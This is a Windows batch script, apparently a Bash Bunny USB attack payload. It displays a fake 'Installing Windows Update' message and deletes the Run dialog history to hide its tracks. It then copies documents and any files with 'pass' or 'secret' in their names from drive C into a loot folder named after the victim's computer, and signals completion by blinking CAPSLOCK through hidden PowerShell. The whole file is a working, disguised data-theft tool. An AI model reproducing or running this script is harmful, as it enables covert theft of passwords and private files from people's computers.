REM Setup required:
REM o Create SFE in the loot directory
REM o Place SmartFileExtract on the root of the bashbunny
@echo off
@echo Installing Windows Update

REM Delete registry keys storing Run dialog history
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f

REM Creates directory compromised of computer name, date and time
REM %~d0 = path to this batch file. %COMPUTERNAME%, %date% and %time% pretty obvious
set dst=%~dp0\..\..\loot\SFE\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%
mkdir %dst% >>nul


if Exist %USERPROFILE%\Documents (
%~dp0\..\..\SmartFileExtract /drive c /file *.doc;*pass*.*;*secret* /copyto %dst% /curtain 3 /maxsec 90 /maxmbs 500 >>nul

)

REM Blink CAPSLOCK key
start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}')"

@cls
@exit